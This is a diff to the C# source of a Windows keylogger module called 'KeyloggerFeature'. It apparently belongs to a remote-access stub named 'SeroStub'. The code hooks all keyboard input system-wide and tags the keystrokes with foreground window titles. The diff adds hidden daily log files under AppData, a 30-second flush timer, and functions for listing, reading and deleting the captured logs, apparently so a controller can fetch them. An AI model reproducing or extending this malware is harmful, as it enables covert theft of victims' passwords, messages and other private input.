@@ -1,13 +1,12 @@
-using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Text.Json;
+using System.Timers;
 
 namespace SeroStub;
 
 internal static class KeyloggerFeature
 {
-    // ── WinAPI imports ─────────────────────────────────────────────────────
+    // ── WinAPI ─────────────────────────────────────────────────────────────
     [DllImport("user32.dll")] private static extern nint SetWindowsHookEx(int idHook, nint lpfn, nint hMod, uint dwThreadId);
     [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(nint hhk);
     [DllImport("user32.dll")] private static extern nint CallNextHookEx(nint hhk, int nCode, nint wParam, nint lParam);
@@ -32,17 +31,50 @@ internal static class KeyloggerFeature
     private const int  WM_SYSKEYDOWN  = 0x0104;
     private const uint WM_QUIT        = 0x0012;
 
-    // ── State ──────────────────────────────────────────────────────────────
-    private static nint         _hook;
-    private static Thread?      _thread;
-    private static volatile bool _running;
-    private static uint         _threadId;
-    private static readonly StringBuilder _buf        = new();
-    private static readonly object        _bufLock    = new();
-    private static          nint          _lastHwnd;
-    private static          string        _lastTitle  = string.Empty;
+    // ── Disk logging ────────────────────────────────────────────────────────
+    private static readonly string _logDir =
+        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                     Config.PersistName, "kl");
 
-    // ── Public API ─────────────────────────────────────────────────────────
+    private static string TodayFile =>
+        Path.Combine(_logDir, DateTime.UtcNow.ToString("yyyy-MM-dd") + ".txt");
+
+    // Flush in-memory buffer to disk every 30 seconds
+    private static readonly Timer _flushTimer = new(30_000) { AutoReset = true };
+
+    static KeyloggerFeature()
+    {
+        _flushTimer.Elapsed += (_, _) => FlushToDisk();
+    }
+
+    private static void FlushToDisk()
+    {
+        string text;
+        lock (_bufLock)
+        {
+            if (_buf.Length == 0) return;
+            text = _buf.ToString();
+            _buf.Clear();
+        }
+        try
+        {
+            Directory.CreateDirectory(_logDir);
+            File.AppendAllText(TodayFile, text, Encoding.UTF8);
+        }
+        catch { }
+    }
+
+    // ── State ───────────────────────────────────────────────────────────────
+    private static nint          _hook;
+    private static Thread?       _thread;
+    private static volatile bool _running;
+    private static uint          _threadId;
+    private static readonly StringBuilder _buf     = new();
+    private static readonly object        _bufLock = new();
+    private static nint   _lastHwnd;
+    private static string _lastTitle = string.Empty;
+
+    // ── Public API ──────────────────────────────────────────────────────────
 
     internal static bool IsRunning => _running;
 
@@ -50,6 +82,7 @@ internal static class KeyloggerFeature
     {
         if (_running) return;
         _running = true;
+        _flushTimer.Start();
         _thread = new Thread(HookThread) { IsBackground = true, Name = "KL" };
         _thread.Start();
     }
@@ -58,6 +91,8 @@ internal static class KeyloggerFeature
     {
         if (!_running) return;
         _running = false;
+        _flushTimer.Stop();
+        FlushToDisk();
         if (_threadId != 0) PostThreadMessage(_threadId, WM_QUIT, 0, 0);
         _thread?.Join(3000);
         _thread = null;
@@ -66,6 +101,7 @@ internal static class KeyloggerFeature
 
     internal static string GetAndClearLogs()
     {
+        FlushToDisk();
         lock (_bufLock)
         {
             var s = _buf.ToString();
@@ -74,28 +110,53 @@ internal static class KeyloggerFeature
         }
     }
 
-    internal static string GetLogs()
+    // ── File management ─────────────────────────────────────────────────────
+
+    internal static KeyloggerFileInfo[] GetLogFiles()
     {
-        lock (_bufLock) return _buf.ToString();
+        try
+        {
+            if (!Directory.Exists(_logDir)) return [];
+            return Directory.GetFiles(_logDir, "*.txt")
+                .Select(f => new KeyloggerFileInfo { Filename = Path.GetFileName(f), Size = new FileInfo(f).Length })
+                .OrderByDescending(x => x.Filename)
+                .ToArray();
+        }
+        catch { return []; }
     }
 
-    // ── Hook thread ────────────────────────────────────────────────────────
+    internal static string GetFileContent(string filename)
+    {
+        try
+        {
+            var safe = Path.GetFileName(filename);
+            var path = Path.Combine(_logDir, safe);
+            if (!File.Exists(path)) return "";
+            return File.ReadAllText(path, Encoding.UTF8);
+        }
+        catch { return ""; }
+    }
+
+    internal static void DeleteFile(string filename)
+    {
+        try
+        {
+            var safe = Path.GetFileName(filename);
+            File.Delete(Path.Combine(_logDir, safe));
+        }
+        catch { }
+    }
+
+    // ── Hook thread ─────────────────────────────────────────────────────────
 
     private static unsafe void HookThread()
     {
         _threadId = GetCurrentThreadId();
-
-        // Get function pointer for the hook callback — requires unsafe context
         var fp = (delegate* unmanaged<int, nint, nint, nint>)&HookProc;
         _hook = SetWindowsHookEx(WH_KEYBOARD_LL, (nint)fp, nint.Zero, 0);
 
-        if (_hook == nint.Zero)
-        {
-            _running = false;
-            return;
-        }
+        if (_hook == nint.Zero) { _running = false; return; }
 
-        // Message pump — required for low-level hook to receive events
         while (_running && GetMessage(out var msg, nint.Zero, 0, 0))
         {
             if (msg.message == WM_QUIT) break;
@@ -107,15 +168,11 @@ internal static class KeyloggerFeature
         _hook = nint.Zero;
     }
 
-    // ── Hook callback — [UnmanagedCallersOnly] = NativeAOT-safe ───────────
-
-    [UnmanagedCallersOnly]
+    [System.Runtime.CompilerServices.UnmanagedCallersOnly]
     private static nint HookProc(int nCode, nint wParam, nint lParam)
     {
         if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
-        {
             try { ProcessKey(lParam); } catch { }
-        }
         return CallNextHookEx(_hook, nCode, wParam, lParam);
     }
 
@@ -125,31 +182,27 @@ internal static class KeyloggerFeature
         uint vk = khs.vkCode;
         uint sc = khs.scanCode;
 
-        // Skip pure modifier keys (don't log shift/ctrl/alt/win alone)
         if (vk is 0xA0 or 0xA1 or 0xA2 or 0xA3 or 0xA4 or 0xA5
                 or 0x5B or 0x5C or 0x10 or 0x11 or 0x12) return;
 
-        // Track foreground window for context headers
         var hwnd = GetForegroundWindow();
         if (hwnd != _lastHwnd)
         {
             _lastHwnd = hwnd;
-            var titleSb = new StringBuilder(256);
-            GetWindowText(hwnd, titleSb, 256);
-            string title = titleSb.ToString();
+            var sb = new StringBuilder(256);
+            GetWindowText(hwnd, sb, 256);
+            string title = sb.ToString();
             if (title != _lastTitle && !string.IsNullOrEmpty(title))
             {
                 _lastTitle = title;
                 lock (_bufLock)
                 {
                     if (_buf.Length > 0) _buf.AppendLine();
-                    _buf.AppendLine();
-                    _buf.AppendLine($"[ {title} — {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss} UTC ]");
+                    _buf.AppendLine($"\r\n[ {title} — {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss} UTC ]");
                 }
             }
         }
 
-        // Try to convert VK to printable character using current keyboard layout
         var ks = new byte[256];
         GetKeyboardState(ks);
         var charBuf = new StringBuilder(4);
@@ -158,52 +211,43 @@ internal static class KeyloggerFeature
         lock (_bufLock)
         {
             if (n > 0 && charBuf.Length > 0 && !char.IsControl(charBuf[0]))
-            {
                 _buf.Append(charBuf[0]);
-            }
             else
             {
                 string? special = VkToLabel(vk);
                 if (special != null) _buf.Append(special);
             }
 
-            // Keep buffer bounded (max 512 KB)
-            if (_buf.Length > 512 * 1024)
+            // Keep buffer bounded — flush to disk before it overflows
+            if (_buf.Length > 256 * 1024)
             {
                 var text = _buf.ToString();
                 _buf.Clear();
-                _buf.Append(text[^(256 * 1024)..]);
+                Task.Run(() =>
+                {
+                    try { Directory.CreateDirectory(_logDir); File.AppendAllText(TodayFile, text, Encoding.UTF8); } catch { }
+                });
             }
         }
     }
 
     private static string? VkToLabel(uint vk) => vk switch
     {
-        0x08 => "[Backspace]",
-        0x09 => "[Tab]",
-        0x0D => "\n[Enter]\n",
-        0x1B => "[Esc]",
-        0x20 => " ",
-        0x21 => "[PgUp]",
-        0x22 => "[PgDn]",
-        0x23 => "[End]",
-        0x24 => "[Home]",
-        0x25 => "[←]",
-        0x26 => "[↑]",
-        0x27 => "[→]",
-        0x28 => "[↓]",
-        0x2E => "[Del]",
-        0x2D => "[Ins]",
+        0x08 => "[Back]", 0x09 => "[Tab]", 0x0D => "\n[Enter]\n",
+        0x1B => "[Esc]",  0x20 => " ",     0x2E => "[Del]", 0x2D => "[Ins]",
+        0x21 => "[PgUp]", 0x22 => "[PgDn]", 0x23 => "[End]", 0x24 => "[Home]",
+        0x25 => "[←]",    0x26 => "[↑]",    0x27 => "[→]",   0x28 => "[↓]",
         0x70 => "[F1]",  0x71 => "[F2]",  0x72 => "[F3]",  0x73 => "[F4]",
         0x74 => "[F5]",  0x75 => "[F6]",  0x76 => "[F7]",  0x77 => "[F8]",
         0x78 => "[F9]",  0x79 => "[F10]", 0x7A => "[F11]", 0x7B => "[F12]",
-        0x13 => "[Pause]",
-        0x14 => "[CapsLock]",
-        0x90 => "[NumLock]",
-        0x91 => "[ScrollLock]",
+        0x14 => "[Caps]", 0x90 => "[NumLk]",
         _ => null
     };
 }
 
-// ── JSON types for SeroJson context ──────────────────────────────────────────
+// ── Data types ────────────────────────────────────────────────────────────────
 internal class KeyloggerLogsResultStub { public string Logs { get; set; } = ""; public bool IsRunning { get; set; } }
+internal class KeyloggerFileInfo       { public string Filename { get; set; } = ""; public long Size { get; set; } }
+internal class KeyloggerFilesResultStub { public List<KeyloggerFileInfo> Files { get; set; } = []; public bool IsRunning { get; set; } }
+internal class KeyloggerGetFileStub    { public string Filename { get; set; } = ""; }
+internal class KeyloggerFileContentStub { public string Filename { get; set; } = ""; public string Content { get; set; } = ""; }
